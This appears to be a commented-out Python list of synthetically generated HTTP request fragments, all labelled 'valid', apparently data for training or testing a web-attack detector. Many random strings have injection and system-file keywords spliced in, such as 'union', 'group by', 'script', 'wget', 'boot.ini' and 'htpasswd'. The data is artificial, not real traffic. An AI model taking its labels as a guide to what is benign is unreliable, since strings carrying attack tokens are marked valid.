#  {'pattern': '/ca1k7a7rsih1nayteree/mtsl0eieirdn9/ksp2nhcia/i3s2oozide/sb3/ajuz48sir7_o.g8/5paosdartainthh7et.shtml',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'rreneostc5wg= |s;l1http0v6v=r5xub;ntv7ott7s=tju0a',
#   'type': 'valid'},
#  {'pattern': '/6f/cvystttuegniscyuce/axe8/cmakplyhu/bdtignto.jsp',
#   'type': 'valid'},
#  {'pattern': 'boopsg7exbk3p= ;ywx3@aotobg0=@<system3o4irltne;8w=3587;tvimgys=s2lsrzseuto7',
#   'type': 'valid'},
#  {'pattern': 'mozilla/4.3 (x11; u; sunos sun4u 8.2; hf-me; rv:1.8.3) gecko/04692964',
#   'type': 'valid'},
#  {'pattern': 'hn=xmtrkh&elwe=rii&iq2deuwj=qaiyqzieam08h&lseaab5jtoijoow=siu&h6bd.bfselectp96=nnasheo@lceadwh&ebrgpht9nv=nsr&tee6er5om7pexqe=$qb cmn?nursswcetoinclude&updateyostyle=xaaioeaoawdhelts',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.4 (windows; u; windows nt 1.4; oi-ce; rv:6.3.5) gecko/46788532',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.7, gzip;q=0.0, gzip;q=0.0', 'type': 'valid'},
#  {'pattern': '/t7ko.shtml', 'type': 'valid'},
#  {'pattern': 'igkshutdown=1rpu&oshurh=256216271', 'type': 'valid'},
#  {'pattern': '/anftatoacar/mbmtasetlude0kct/ekv/qsoscrvnaoadfgpiaen.cgi',
#   'type': 'valid'},
#  {'pattern': 'tfegeowoauf=55q&oiiortva=43&o3=6296&2eauk75drtnit0e=ecoejee$&a8eboh=nfsjshza3daretnalw&bup=6440&hieu=&osjaoirhsa&jh9@mbh8fzdw=it1&hfgno=431574&o2swinntox6u=otnph-ehscript&oilawtrclosn=nnoyea]scriptri&oaesno7c9tcdt=484279&rubea4z=41751787&otulanrprsoht=97542&hsieieonf=etbzoq8q',
#   'type': 'valid'},
#  {'pattern': 'iycesrtpmlmkp=125&monaafydhuq=600&ddtroeeces9np=e&ro3qftn82scai6n=oax&ce=keni&mefadwni=oeu0@dsk0l&obnh4=nieoauohm&n5cyrdomsn0nw=ngnnct5f6jslotm0w&omqeaesojhiua7=2%ne]un cccs&ztarjede9h4safk=ojyodfo&tegee=|\\sa&xsq65=l7oedqj&tmtfeit18mettt=761',
#   'type': 'valid'},
#  {'pattern': '/a0im0l4b4bcen7mkj/eru9ooooetna/astylewobodydad8p/aieyue8fiuncg/ensowtnevxyu/t.v4q3.wydycpicb/tpiysafeeic/icibjzkx/4tlnia82aaitseenh/ehetbeoirt55.mspx',
#   'type': 'valid'},
#  {'pattern': '/rfkittzcd3nm/tkrxblqyp./ivbaccess_logq3uskb@location4/1lob63saoweqine/6kgjhasqam1w/rit/ucob0b5yq0_w/lwax0lbnowqqatmyvlov/emlckyq0novo9ejs2/eolhsanutnn/p_r_q-ja.exe',
#   'type': 'valid'},
#  {'pattern': '/kbaetm/so/0hze5dtvaaten/ai/updatedpynmocharcpi3y/tvlqnquui/unk4fxbd4/5secrn/oqih.asmx',
#   'type': 'valid'},
#  {'pattern': 'ikooekjnrhtr9=0725&wxf2dopttit0=625144715&s7snen=eby7)zepyb 8e&tl9noaeel=8&ehpbhsit5lsr=as&1m=mdl&peei3t=831768038&e2tiakthc6n=havingloi?&f@.qlkv3kkql=sunion',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '6bp0wpn=8256265039', 'type': 'valid'},
#  {'pattern': 'g91enhat1=elsimeaate&gp0khqniie1=30146118&sservices23xsn2==y &obngahotc0axcf= &ersupnhnshha=raeb;sb&dheenncer=82&k7dr%uc5v=oz5p&f1esezmie5aaotl=ao% dtnliioftr/rpe&er8a=mhe1cutsr&dmmiuw=94071&0oyte=7596&tehes=11865429',
#   'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': 'izfqefe7-eop;q=0.9, ho-bws', 'type': 'valid'},
#  {'pattern': 'mozilla/0.8 (compatible; xfodeeah7; windows nt; rhtt; e4umebii)',
#   'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': '/i87lq7cm/i9e@suhjx5ox.ux/icyyvtd6hb/cltrxeetalwxieapm0d/ejus/oe6edafhandel3n/4ofkrsc80n5htqxj6u/oflponrukicpw-sx6f0j/aeot/sxjzqygyje/kcformu.pl',
#   'type': 'valid'},
#  {'pattern': '/tehleafrs6trtut/rnothslaer5yueit.exe', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': '/eeshatvoeetrjvc7ii/rrzao79ybz.9l43/2enhtgzsyaneseraod6/3j3cfvcxechony1en/omhoonemaclsnvo/ontllhteih0ereaes.png',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.7', 'type': 'valid'},
#  {'pattern': 'w9dtnrdthqs5s', 'type': 'valid'},
#  {'pattern': 'lwmheqe6nhnoaj=pm<optnunreinsertti9group byyii=&thmon18dm9o=8714',
#   'type': 'valid'},
#  {'pattern': '/trioaicyrtoweuiaast/aw/rucrh/namsseuoarasorn22tf/ach7nkm8pqrseg3lxcnb/fnwf/adsyh_nufoe9-352ljn.asmx',
#   'type': 'valid'},
#  {'pattern': 'sesgls7uqiyieae=41828528;4fnpn79isicte=81;lgmail-m=chgtio',
#   'type': 'valid'},
#  {'pattern': 'thtovluhthhp=r0d&entasznbantsp= ?i nehh&viohsrroe=iherhrtie2rotu&1odrhoe6iwsjhv=6568442&@s.xlfc8z=0.6.p&8otltrare6eide=taal6eph~siao>g7e&mlle6=op0znr&il_5o4pm2rm=750081&tltb=trje@-&ketee=318283&toe8glecu= l?tts: b8',
#   'type': 'valid'},
#  {'pattern': 'mozilla/9.4 (windows; u; win 9x 0.3; n1-3q; rv:1.4.3) gecko/68924305',
#   'type': 'valid'},
#  {'pattern': '/h99og92ksnqo/tkmzem5ijmetapduyj/myiip5dnhbptmpusr@w/ekqqd2m/iswssk9vso/rgi2g/a4itjxn.tiff',
#   'type': 'valid'},
#  {'pattern': '29v1tr1h http://www.ntdnre.com', 'type': 'valid'},
#  {'pattern': '4m-n3rcnult;q=0.8, anemyt-1hxsa;q=0.2, oondrsn-klqecam1, drys-pes;q=0.4',
#   'type': 'valid'},
#  {'pattern': '/cgljvy02djinams/hfebnfi/joo@/ngmbiw7nxun0o/tp-3/tj2nyfwdg3jsn@nzgwzl/aes/andaooannla9hi/mmfp8zvcs/ea7tdgdadrreuf.aspx',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.9, gzip, deflate;q=0.6, identity;q=0.1',
#   'type': 'valid'},
#  {'pattern': 'iex=58460828;jhiphpof3qcopy=ds1ciju bchildle;dnsaes6oibez=nadehmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'type': 'valid'},
#  {'pattern': 'iex=58460828;jhiphpof3qcopy=ds1ciju bchildle;dnsaes6oibez=nadehmrsrjrnti;7nmg=3eael;s2sm=eopted',
#   'type': 'valid'},
#  {'pattern': '/bztoptwindow.open4/bpboot.initp_5l/u2ceiaccsjii/pstdinulvmfbg/t8rojgh4/i3taepwmfaa/qpwm.ydxrng7rmb.ms.nsf',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'cgrsvltiig9=25access_logbtrecena&8i=3pitjq&eesschsenosirv=vz3&tln=ahd9ccattncnnas3ftp]nd%&iotye=7 &7e4=cnfriixftdn&uueniatirn=20414&3xneerterrn=al',
#   'type': 'valid'},
#  {'pattern': '/ausrgloirlsu/ytaa/h5scl/swf3vgihjpettipthonw.shtml',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.2 (compatible; msie 8.9; open bsd i386; mebmlpu; oinitlo3s; renenumeh)',
#   'type': 'valid'},
#  {'pattern': 'mnh8c=5611&gnlho=bcnt8euth&yirgi=get:emetan6&r8kdc=ol5&cciir=ioins5n&pozvefip=bi&ulyolpeanet=7991549672&toxowttt=wp-jteichild&rerilodpc4dse=wsmwiaruaeqqi6ohah&3oietitrh3tcp=it/fi&s-aq-ldocument=1&oaqi=yi%uyaee62e',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/h8h2mgroup byf_d2acke/p7whereznv@vab5u/mnn.aspx',
#   'type': 'valid'},
#  {'pattern': '/mljq.zjo/ncks7x3/eby@/ssyl_b1/bnodt/tu5mcnit1uyn0odmaxz/efpqp/ooiqljnigu_.htm',
#   'type': 'valid'},
#  {'pattern': '/eihemi9mblb/0k.gif', 'type': 'valid'},
#  {'pattern': '/4lcbn@jvlservicestov/avm@xm2vpxworcag41n/bhcuaoyseg/iykzeiotkeqsrkms/2a-xt/ojvpefx2s.kscju/eoava7hlist.jsp',
#   'type': 'valid'},
#  {'pattern': 'umoprocessing-instruction7=4', 'type': 'valid'},
#  {'pattern': 'umoprocessing-instruction7=4', 'type': 'valid'},
#  {'pattern': 'identity, compress;q=0.8, gzip, identity;q=0.5',
#   'type': 'valid'},
#  {'pattern': 'oi5inwehokeoe=ti&raiub=auylcmnhz9', 'type': 'valid'},
#  {'pattern': 'ngn0=betweendtotscript5jtu4rtgoit8&ogeaoof1=27&oaoxass=nereisgx3cxhsnnu&bhlju3zcetcf=tfm&acu=-ehtpassc:&4lt=cxsiid~6rz[&dqco72esjmpa=32278041&cc@g6vmimhps=str&ers=ldo2inll<aat&ehatbg1seih=gneegossifr4rt',
#   'type': 'valid'},
#  {'pattern': '/kevnmtkqmaidkhhexua/trdhp9atwta/edtr9/iraaitldtd0e/esazkugr9t@gdz/oa3x/nautoexecjopnrc9jozftp/w0spushr/re4nmheianmdrqee3.mdb',
#   'type': 'valid'},
#  {'pattern': '/adminccmawnunionjatc/jvcrcpd@hqvi4kx/asi1o.mspx',
#   'type': 'valid'},
#  {'pattern': '/risortmmr/qtilg5bvdrlocation/usiw1omnmemo.png',
#   'type': 'valid'},
#  {'pattern': '/bd_pic.2perl1nf/oronwhe/annuutoozaruc/rtldeadsc1jieaite/ettsn/hn.wssxvoo2nkksnro/ne7oihbci-pisr6-aqkj/rpzafa-sl/sstrozewhonrm1.php',
#   'type': 'valid'},
#  {'pattern': 'deflate;q=0.4, gzip, gzip;q=0.6, gzip;q=0.6', 'type': 'valid'},
#  {'pattern': 'xbudegohlz0=e;s&tpc=lv8tbjo0&fsgidg=9409647&nabvw=870292&itla1teen=6197531&auevtylc= esr &ydcter=~hteeu ahinhttp1vy&deest=e&hzeumail=czz2w&_j1ds@ziwij=eqstaoale2g=@8&dshz=scripte',
#   'type': 'valid'},
#  {'pattern': '/oseoeotef/ntnnsir0th.bin', 'type': 'valid'},
#  {'pattern': 'aueluirssi51d=zr1q;oenh2aii=argcnztreplacei lwiobit;sgi6nbocfneua0n=rdr3x9gx',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '1o8l-ndgrs;q=0.3, u-bu', 'type': 'valid'},
#  {'pattern': '/y8gpozlsf2yldd3aeq/nite/bpo0ghgvgfo2/trerhrkr/d6@.shtml',
#   'type': 'valid'},
#  {'pattern': 'amoxgic=cdvv-37fs;tfnshanc=94514825;oetoo= window.openca;dsnh=vea0moigioh8link;nte3s=3985318',
#   'type': 'valid'},
#  {'pattern': 'eoaws0rut=irewwrtxaubr3oi&3s.obmonodet=pft&.bdo@sqonfwp=oa',
#   'type': 'valid'},
#  {'pattern': "doiw5pvie=ea3b&tccmglimma7rc=632&pexec_inph-xi0g-=79597&alsa=o&qdirfqt=ncr'\\&eeqnfl=2774976&ruisofghvuwost=r&_xhwtuaonjmj=465&wz-fbineobl=4&hnokyf=o rll~t&erok5i=79353055&b6ccubkogmailhm=e eermws6e&tuel0hooksget7=91434",
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': "32ujtn7nt=ih1a &egseen=6&r84hlec=54&esowsjasttssson=abyhm6iasm&5n8sae=cr?ets(mtao&ntntwvteuixnt=fhncnsns&tbobicghsr=hl%uall3anmconnect&nadh=r3ecotter0tcohae&jee=/nc5&aonroti=10977899&etoehacen=ihchildnstbr>m&pbneeendea0=')=a",
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'zzphputmpkhrr@fd=grh&disn&noheduaxdfwle=qdhxeecivefdtiiten&q_.2pd932igl=ylocationhtpasspoeno4sogo &nlh58w1uo3whqr=plsn h&otswma97r=ltdecnsi',
#   'type': 'valid'},
#  {'pattern': '/ejbj3shutdowny/tnvz13/rnmdbutoi@-wafor-44/vvfl/ve/czmstss1tutdk/sdatmasmxhnhhsaeancz/formtw0a1epvrg/shonn.htm',
#   'type': 'valid'},
#  {'pattern': 'cobsntefol=nhe', 'type': 'valid'},
#  {'pattern': 'ebg1vhe=ldqtcng&kaccepto7t=s4vbscript@&thu=c&n&8tlhr=746465518&ole6u=52&edoeu4o=24867885&wtxf7o=h<q/bejt:onai',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'coospiyrlmupud', 'type': 'valid'},
#  {'pattern': 'egd=wnm57cneenotstde;rrznv=awhhzjwegeq_', 'type': 'valid'},
#  {'pattern': 'egd=wnm57cneenotstde;rrznv=awhhzjwegeq_', 'type': 'valid'},
#  {'pattern': 'eonoheethu=a/t&ohrwhereu/i&gan5pletbc7fhy=se htaccest&neraetssdnth=7277692&chsdedsbrnlpn=5639187&i4nar0iadj=485&edsnhextaoilse=0042&r8enrde2n=uynlh2&wimlrra=ueoee uxht&wxk4nyok8z=oiesst&sk1qtpexec-g=byaccept9v&wde=shutdown&bl=tthhwh;riji&ntblentqrn=286687&eeern=dj)rslihtr fadnexec&agop=ics',
#   'type': 'valid'},
#  {'pattern': '/h8vxf0rb/6awrorreit6n/dwizs/ahnbo3odrop.y9-uf/rg-y9wb_sv/pereeoato7ceenoen/lg/mcbagtfw2xb62zwawofx/arphhuht.gif',
#   'type': 'valid'},
#  {'pattern': '/aptcw.6_a.2kuy.ocjrl/ooe/aoceawwelfzik/nw/3vmochafrom/tf877cehsqo2e/nqwmtylw-/wucehocrs/yxgvx8v2b.3w/em9krpy.msf',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'gu=c)7&4ptyasnd4d=pz-.3&hvc=ni3', 'type': 'valid'},
#  {'pattern': 'to4=2426558&eeoaeo9mhteicxr=to] g9p&zqo9.clkdoxc= sht&esoae=cimu&oxecihllueeper=6orrsoy&seh=ianelred4bghki&e3zo=39',
#   'type': 'valid'},
#  {'pattern': '/oe.kshygf7eyx/apsnl1rlmnnehtd/it/ecetakbo3ifiaes/hs1servicesu1gs6g@e/riwtd/ptecloioeetni4iu2esd.bin',
#   'type': 'valid'},
#  {'pattern': '/4rseu4@@k1jtehgh7tmo/yookh/iitisa/x1tmtnnusso/n8d6y9aoofpdx_d/r2ctyqoxpu_7o8a/fcrridsuhdflifahlots/ctp/npcpbcfudp/rdelaltr.jsp',
#   'type': 'valid'},
#  {'pattern': 'txlucghabr http://www.t8iht.gov', 'type': 'valid'},
#  {'pattern': '/.kfk4/ugctltv5eyap.mspx', 'type': 'valid'},
#  {'pattern': '/tvxwosyaosddb8ismrp/0qyc4aqt83njeqffg.dll', 'type': 'valid'},
#  {'pattern': 'aanmge=1022753;tpii=ol;h7zx lz];uooen=3%a;e7es=3183;ame7k=i6',
#   'type': 'valid'},
#  {'pattern': '/dv/roaterofdee4aotss/0de/advg9t7kepu9/qxtocotnuhi/rna_jrnrtjpmlh3n/t9/nr3f/tr2uey8/y2urnwiu01edntt5.html',
#   'type': 'valid'},
#  {'pattern': 'oas=~r(sock_stream$&5elddnodehome6=eudzs6&3egok2m5f@l1=1dpuoiltnmtr&nlusmoliaag=rili9_0ify0s&z0rselectji.x@c=hlsrm9eanl4dt0wtz&ldc=tlt]dnkt=/isn|mlwgetl&43oeslesnbopos=utservices&syyoeolsmp4=s7vbhb8jik&anrshriesem=includehx:&cdaseoeqgeondrd=x6eaos&itpu6cxhswo=ouwot&amteirl7oeipsba=17235',
#   'type': 'valid'},
#  {'pattern': 's4cyld7-wnlt5pld;q=0.5', 'type': 'valid'},
#  {'pattern': '/o-onwhsnrzosmls/_ydpmailw06/glu4yc0dlbhgkul/r0wftpcurdj7ls/bbk/multa6i.php4',
#   'type': 'valid'},
#  {'pattern': 'niajp1=lyeoawtsat&lsrt=dl &manee=r8bag&othaapshhnn=ferhal&sfnlee5tuitda=wgs81yxh&sredt9t=6taipsloboni3z6h&likeunask0ao=cla9\\$',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'te4esos-memc;q=0.1', 'type': 'valid'},
#  {'pattern': 'ceesmoarel=grcc&osh=ed&ipigaldedtmeeh=eoaf8y3eeixsrseh3&aoheh=hhyee=lnnam%e&tshna=is4rt\\;pe xc&xw&tirdap=s>dur42o\\aertm q5vxterme&ytnppvhhhuoz3rh=ej6p-&ntupprnnm5iucj=oetmrtrl5gd&tvrh7fnc=0g@h9e_&msiot2eratuee=12067602&gz2fmkmlinka=hf-',
#   'type': 'valid'},
#  {'pattern': '/f3v7.udmform-q/uore0iv0/slsfozp6aygotxfieo/f3rejtjlh/troqiu/6taultisemitm.html',
#   'type': 'valid'},
#  {'pattern': '/usjhsiaezlti2s9.cfm', 'type': 'valid'},
#  {'pattern': '/thcb1nilvc5nqkuo9xvb/rvn/jem6rgbw/cdoe6roh/tnoumnkme1sib/zxd_k/mp/ajtaiqtpa2ftns/mencrb2id5/esmom/ceeraterw3s.gif',
#   'type': 'valid'},
#  {'pattern': '/nx_ujxa7arp4/tneeewreln2rxtetsare/k0x9sulxmetaniap6n/shoteio6tzadenletn/dn-ta/dettitlc2bhesnpimceh/onb/0bodychildikep6x.cfm',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/aqo@nqlleb/aabuehh5befsr/ia/qcpassthru.php4', 'type': 'valid'},
#  {'pattern': '/l-paflm-2-i1ok/hxqeggar/pmc6tb4fx.nsf', 'type': 'valid'},
#  {'pattern': 'od-1, siss-iewbonov;q=0.2, 0he-jn2ee', 'type': 'valid'},
#  {'pattern': 'egxnnvi1a http://www.ehecnf.cz', 'type': 'valid'},
#  {'pattern': '/qf_x5pqzf-f/aszcp8gl7x/i0n/nntnhjtag/yrzx_-xtmv/dri/pde9n1cihfjha.sh',
#   'type': 'valid'},
#  {'pattern': 'compress;q=0.6, deflate;q=0.7, deflate, deflate;q=0.4, compress',
#   'type': 'valid'},
#  {'pattern': '/7ef7yi/iarsu.gif', 'type': 'valid'},
#  {'pattern': '/hmsyggqiahsock_stream/sze/qdhn/ojetxlhfahoolaa/eqkcl/zkywautoexec0yqbnvara9ro/uzh/mu0gutsed4prs0jte/stx-dp-jcat8.asp',
#   'type': 'valid'},
#  {'pattern': '/ehh/ietrpadabtlae/s08a/ip/maoreohthe/esqhctisoe/2la/lsioty/tanenjxesegakaori/oinput/hsqa_wvue.tiff',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.2 (x11; u; unix 3.9; e7-h2; rv:8.7.5) gecko/19805192',
#   'type': 'valid'},
#  {'pattern': 'insertmrs=qjnvneamnne&cemanr=aguub8ymk_l&crircsic=laohst&nz6t0=5082&tvr7=ngroup byttno2eoncin>',
#   'type': 'valid'},
#  {'pattern': '/car-rkgyg/kmhixycd/dkvl5eyeu/i2-r46.mspx', 'type': 'valid'},
#  {'pattern': 'tarozon=ag9ktlet&oth=itp5aasoerht?\\efn&nagbrhnnownhnpr=30562955&ss=aperleh',
#   'type': 'valid'},
#  {'pattern': '/3iqesan9ntuhitofwi/yro0ei/ercojprqcb/62oyxzmmk6vbm/ay6dijedao79nsvs/tcs2fuxto/late0/lpfi08gblsjuy/tri49n3/qsm6c/nyy0h/t8.bin',
#   'type': 'valid'},
#  {'pattern': '/lqvymbbn.fofhwwzyw/8jalggq1v8h/n.ka/scybzspgacjtk/1rg.nsf',
#   'type': 'valid'},
#  {'pattern': '/pij.mspx', 'type': 'valid'},
#  {'pattern': '/hzuq9uyqi9klv/bqkukphbygkz2z/h0tfa.9qquay/ak2sg5dqe3a3gv/3uaefhdentiaeah9tge0/dhndne.mspx',
#   'type': 'valid'},
#  {'pattern': "eeihule9oht=5561374&acsnmhdy=unmo~uj&vufoeo=hh7metaeornx&1imetapiv=50772438&osots=m8lv8f&ifecga=ceimeoeseoe nm&htehuwob3r1eufo=ueuyuen&nsaenscjhzthotu=5104&wroalhahsc=a&boot.inikautoexec6mbg=6'eao@elafiiyt0ie&upgygvrw=fbec-&tdcsslfijr5a=lokwretane&ls=neli&ikafjmenoe=258935958",
#   'type': 'valid'},
#  {'pattern': 'jb3nvgyk=7&sh=bimzbbse5-a&uedlsntl=osig8asebbn&measnetnuopes=3960684&ombtamrdnit4eea=lii',
#   'type': 'valid'},
#  {'pattern': 'edg=baeendeaao&eoemuiu1cyent8=haa@&qakc= heirnbetweendh&ioktem38ee=794344&ssalote=t&-hsyjg=0664280558&uo1=o0&u9scriptgm0o=40719&tbiilteldnaaoz=alpvse',
#   'type': 'valid'},
#  {'pattern': 'siidiv2sd=y&tiis5e1=txp_e&idsey= dsf>lt[a&txiterb9etr31q=btsse8ce&nrbomeuii0d=nr r&hir=wcmzy6jnteq&lrasnehebuzp=ot4zyg4fso5c&he0aio=ehlp&tmpfaxyxp_=gelffrom&hi&thirrae=rzsdfq8ejxv&onl=&>u&29afbnm=aiteqis',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/0djoc-vbhecx/laolinnanorutlwec/rnoymsskb9ti1zes/bilagkqvrimgxwc/o3bww9piqizuknmnqt./r4@/c56rh5cupy/mtagi/4@sfv.aspx',
#   'type': 'valid'},
#  {'pattern': 'mozilla/2.5 (x11; u; open bsd i586 0.0; eh-mc; rv:2.9.0) gecko/64051755',
#   'type': 'valid'},
#  {'pattern': '/the/d.ffiu/oeoae.shtml', 'type': 'valid'},
#  {'pattern': 'rsatabi=2130&8logz4l2an3=t&ra=ranwgvwatmk&ihe4eglwee=0bconnect99hsureoi/i6mcdiv=',
#   'type': 'valid'},
#  {'pattern': 'mozilla/4.3 (windows; u; win 9x 9.3; ie-ho; rv:2.3.3) gecko/03746200',
#   'type': 'valid'},
#  {'pattern': '/f_fiepth/reswism2ageed8mejp/nncaicullbe.mdb', 'type': 'valid'},
#  {'pattern': 'gzip, deflate;q=0.0, identity, deflate;q=0.2', 'type': 'valid'},
#  {'pattern': '/.nodegif/3flpdminhtpassw_ermm/sxazgohgg18.ff2t4/pinsafe/iobp0o_ri22a/_kyd6@binmw/decho.h_9cincludej7y8l/abx/_whhz1hq7.png',
#   'type': 'valid'},
#  {'pattern': "wr=s &ds8si=tcmlari6l~3imoa&ieletoueqsni=[ae&ooulacsre=2jaa8tmtsehhaheg&sse=69080&d_5wg47dbd4=duef64usdoeiteeheg&i9r=akp@drqrcim&t4=9034456792&bneenoninau=rfntn/iifanvardsock_streamonv'&25i8oal6a=tf;&sraeogurxbtels7=hvx@06wcce&gxl4s9cminclude=e&neteaic=tn$itolpcesi&tabio=n&nt3okrhhz=6hy",
#   'type': 'valid'},
#  {'pattern': '/dominbwodvleeit/dmr65a/qaausl6sctse7dtkitnt/sz3wbp.n-004/33bmi/b1/reaew/6.at2wzhhjuaorz/k3f8yhdue4/hgay5/8hm7swreklt5qhg.sh',
#   'type': 'valid'},
#  {'pattern': '/oh5io/dzyvl4gm1obxbve/albwxsscpdgcgvq@fkxm/ur48exec_cat6aek1o/n7d5m@0gwinntijww/grxqvk02/_ao4xwo/sjidjor-bd/3mqtwlfgyyld5azd__/lv/xhb/arjzckp.asmx',
# ...
#   'type': 'valid'},
#  {'pattern': '/les1ro/ax-.sxuv3cphwhpis/tk4xjr-ox_0fdlkr/trg6pkvi4/f4d@hyelmcnyw/sefwiabf6knxmf/t6j2xenf3pfl.g6nh.asp',
#   'type': 'valid'},
#  {'pattern': '/4de/bcesylwicng/mxsajesiio/uiiaeautaow/jjb/lvxrq6vta9ckqncps/dsv0cnyyszcqi3/tpna/yt8uteeekflanunrt/ieaoifuoma1n/epj@zo3l3bjn/etsr.css',
#   'type': 'valid'},
#  {'pattern': 'laetoas=826&bniae=4&po=47193233&ahnwti= eatsehyodoi3&nshtw=s0ds&iu=eq@hrxrrqj&vw-6u_6ml4=j1iamuecyzfw',
#   'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'mozilla/6.5 (machintosh; u; ppc mac os x 8.8; ec-bt; rv:9.3.8) gecko/04254685',
#   'type': 'valid'},
#  {'pattern': 'a78sgiiemwls=enka5gva4;gsnha4htveey=4 et;fooalsnbhoirtr=12',
#   'type': 'valid'},
#  {'pattern': 'gzip, deflate;q=0.0, deflate;q=0.5, identity;q=0.9',
#   'type': 'valid'},
#  {'pattern': 'enrpa5tcgai=e kiframedivo19', 'type': 'valid'},
#  {'pattern': 'yp4e-rhgir;q=0.1', 'type': 'valid'},
#  {'pattern': 'arwoyib=duolqbvgdg_g&euruutueaua8od=sf3zkog@nszw&lwlvlm7=9tpk3vpgyr&bthhtopaonnhf=7879',
#   'type': 'valid'},
#  {'pattern': '/tyztv28/eaay6.swf', 'type': 'valid'},
#  {'pattern': '/ecintserst/3u1uw4ts/rid.exe', 'type': 'valid'},
#  {'pattern': 'identity;q=0.7, deflate, gzip, compress;q=0.5, identity;q=0.7',
#   'type': 'valid'},
#  {'pattern': 'alsrehpasfmlf=49821;lifr5ca=66eovstard', 'type': 'valid'},
#  {'pattern': 'alsrehpasfmlf=49821;lifr5ca=66eovstard', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/axydpvxfzfy/ix_r/rwroc52tq.h/trid54/eb@1.jpg', 'type': 'valid'},
#  {'pattern': '/rddmsho8/pzeserdoittr/pfqmpm.mdb', 'type': 'valid'},
#  {'pattern': 'ietp-jt;q=0.5, coefuvz-oqg0ee, a-rsetwce;q=0.4, pohts-ceer;q=0.0, 46fihdia-rl',
#   'type': 'valid'},
#  {'pattern': 'drnaguh=5906000;netieaoe8er=0642648;cot=2540;orx@trcpt=0755;eaxpha=tdl;ewont0aemtiiign=bsgwsolegedd',
#   'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': '*;q=0.8', 'type': 'valid'},
#  {'pattern': '/go6gb/uwxfmznzc1pc/apoebs/pwerrzc/trmq.c3abrwun-1hk2/tbp/axnacu7sah/r-1osv02t9mjkfl7i9cv/ae/xpgtznhucdn_kand/hi/hecdrctain.cgi',
#   'type': 'valid'},
#  {'pattern': 'mozilla/2.2 (compatible; msie 7.1; linux i586; e7ohtalte; btfoj4)',
#   'type': 'valid'},
#  {'pattern': '/ogdg/gpp/l7xb/tn/n1wgucbgxxzhkqd5pnl.tiff', 'type': 'valid'},
#  {'pattern': '/po3rt-rewetcl0s/fyhcrqwdee942_s@v/29kp6l154p/dh7s1/blyg6s1ojwl3eulcihk/pwn9vntacc_/o6kca23dhsgpmjyw/dmxxifm7/rxze6rphc.jpg',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 's-ebkaxeau;q=0.0, cdne-nanpcf7i, 8ei-e, zneo-rhaiij',
#   'type': 'valid'},
#  {'pattern': 's-ebkaxeau;q=0.0, cdne-nanpcf7i, 8ei-e, zneo-rhaiij',
#   'type': 'valid'},
#  {'pattern': '9iq4uvnodejp4body=eiketrrxois&on=ufp1mjwx&akl=bhbi&lnrbd9dkp0tnc=teboot.initchomexold3a9/m%m5e&wio3t=a&gbeabcyo5wjs=pzty&hddwu=oywu&rtis8rurprmtekn=mwget',
#   'type': 'valid'},
#  {'pattern': 'btsmrehta=eg=t;nti9vdq=20583625;node2zealu=anntnchu;oes=ote~;drop5yv=xnmu',
#   'type': 'valid'},
#  {'pattern': 'mozilla/0.8 (machintosh; u; ppc 9.0; os-en; rv:7.0.7) gecko/38035384',
#   'type': 'valid'},
#  {'pattern': 'dyyr=ejhyobvy70', 'type': 'valid'},
#  {'pattern': '/5awnamn/9jpiiw5vzvoxytdo3/rqp7fgoni90eu/ftzege1/lhtpassp/lo/fwfoudf1-xm/uvfpaaku-_.gif',
#   'type': 'valid'},
#  {'pattern': '/8f9thc/t6myg42nngfni9rtf/go/luitodh/efeniesiadrnei/terecba4stgmoerudwe/e6xdne/9xel1/gwfotgfzyxz_/nnty0_ji57hfrjwtrc@0/lxmj/ie.asmx',
#   'type': 'valid'},
#  {'pattern': '/b0jxoh9qoqyhm/satpqo/sqrw.8rk4fqu8s9ofdwa/h@kq41mqm8go672hb/iwsgehdr6rdrwmee4rxo/ohga/etz3ytyahrpr0xc79/sutlecsheh6uea/2p/n9eirmgs5tthessgsili.tiff',
#   'type': 'valid'},
#  {'pattern': '/tecetrr7/ttxu9kug/n_hj0py/oinputt/cbzoesebuimheuihhr/s6a2hh34fnre@fxu/sp6iecimr0/ufstfrtrirtl9aue/nmz@08.js',
#   'type': 'valid'},
#  {'pattern': 'identity, deflate, identity;q=0.4, compress;q=0.8',
#   'type': 'valid'},
#  {'pattern': 'y5enttesmo9e=0062881', 'type': 'valid'},
